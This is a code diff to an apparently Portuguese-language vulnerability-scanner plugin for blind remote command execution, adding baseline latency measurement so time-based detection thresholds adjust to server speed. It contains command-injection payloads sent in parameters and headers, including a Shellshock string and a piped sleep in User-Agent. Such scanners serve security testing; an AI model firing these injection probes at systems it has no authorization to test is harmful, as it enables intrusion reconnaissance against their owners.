@@ -81,7 +81,24 @@ ENCODING_PAYLOADS = [
 ]
 
 
-def _test_sleep(target, param, payload, method, threshold):
+def _get_baseline_latency(target):
+    """Mede a latência base do servidor alvo."""
+    latencies = []
+    for _ in range(2):
+        try:
+            start = time.time()
+            requests.get(f"http://{target}/", timeout=6)
+            latencies.append(time.time() - start)
+        except requests.exceptions.Timeout:
+            return "TIMEOUT"
+        except Exception:
+            continue
+    if not latencies:
+        return 2.0
+    return sum(latencies) / len(latencies)
+
+
+def _test_sleep(target, param, payload, method, threshold, baseline):
     """Testa blind RCE via time-based injection em GET e POST."""
     for http_method in ["GET", "POST"]:
         url = f"http://{target}/"
@@ -93,7 +110,8 @@ def _test_sleep(target, param, payload, method, threshold):
                 _ = requests.post(url, data={param: payload}, timeout=12)
             elapsed = time.time() - start
 
-            if elapsed > threshold:
+            adjusted_threshold = baseline + threshold
+            if elapsed > adjusted_threshold:
                 return {
                     "tipo": "BLIND_RCE",
                     "metodo_http": http_method,
@@ -104,14 +122,16 @@ def _test_sleep(target, param, payload, method, threshold):
                     "descricao": f"Blind RCE confirmada via {method} ({http_method})!",
                 }
         except requests.exceptions.Timeout:
-            return {
-                "tipo": "BLIND_RCE_TIMEOUT",
-                "metodo_http": http_method,
-                "tecnica": method,
-                "parametro": param,
-                "severidade": "ALTO",
-                "descricao": f"Timeout após injection de {method} — possível RCE!",
-            }
+            if baseline + threshold >= 11:
+                return {
+                    "tipo": "BLIND_RCE_TIMEOUT",
+                    "metodo_http": http_method,
+                    "tecnica": method,
+                    "parametro": param,
+                    "severidade": "ALTO",
+                    "descricao": f"Timeout após injection de {method} — possível RCE!",
+                }
+            return None
         except Exception:
             continue
     return None
@@ -142,10 +162,10 @@ def _inject_oob(target, param):
     return None
 
 
-def _test_encoding_bypass(target, param):
+def _test_encoding_bypass(target, param, baseline):
     """Testa blind RCE com payloads codificados (base64, octal, double URL)."""
     for payload, method, threshold in ENCODING_PAYLOADS:
-        vuln = _test_sleep(target, param, payload, method, threshold)
+        vuln = _test_sleep(target, param, payload, method, threshold, baseline)
         if vuln:
             return vuln
     return None
@@ -158,12 +178,17 @@ def _test_header_blind(target):
         ("Referer", "() { :; }; sleep 5", "SHELLSHOCK_REF"),
         ("User-Agent", "| sleep 5", "PIPE_SLEEP_UA"),
     ]
+    baseline = _get_baseline_latency(target)
+    if baseline == "TIMEOUT":
+        return None
+
     for header, payload, method in headers_payloads:
         try:
             start = time.time()
             requests.get(f"http://{target}/", headers={header: payload}, timeout=10)
             elapsed = time.time() - start
-            if elapsed > 4.5:
+            adjusted_threshold = baseline + 4.5
+            if elapsed > adjusted_threshold:
                 return {
                     "tipo": "BLIND_RCE_HEADER",
                     "header": header,
@@ -173,12 +198,14 @@ def _test_header_blind(target):
                     "descricao": f"Blind RCE via header {header} ({method})!",
                 }
         except requests.Timeout:
-            return {
-                "tipo": "BLIND_RCE_HEADER_TIMEOUT",
-                "header": header,
-                "tecnica": method,
-                "severidade": "ALTO",
-            }
+            if baseline + 4.5 >= 9:
+                return {
+                    "tipo": "BLIND_RCE_HEADER_TIMEOUT",
+                    "header": header,
+                    "tecnica": method,
+                    "severidade": "ALTO",
+                }
+            return None
         except Exception:
             continue
     return None
@@ -197,16 +224,25 @@ def run(target, ip, open_ports, banners):
     _ = (ip, open_ports, banners)
     vulns = []
 
+    baseline = _get_baseline_latency(target)
+    if baseline == "TIMEOUT":
+        return {
+            "plugin": "blind_rce",
+            "versao": "2026.1",
+            "tecnicas": [],
+            "resultados": "Ignorado: Alvo apresentou Timeout natural no Baseline.",
+        }
+
     for param in PARAMS:
         # 1. Time-based sleep injection
         for payload, method, threshold in SLEEP_PAYLOADS:
-            vuln = _test_sleep(target, param, payload, method, threshold)
+            vuln = _test_sleep(target, param, payload, method, threshold, baseline)
             if vuln:
                 vulns.append(vuln)
                 break
 
         # 2. Encoding bypass
-        vuln = _test_encoding_bypass(target, param)
+        vuln = _test_encoding_bypass(target, param, baseline)
         if vuln:
             vulns.append(vuln)
 
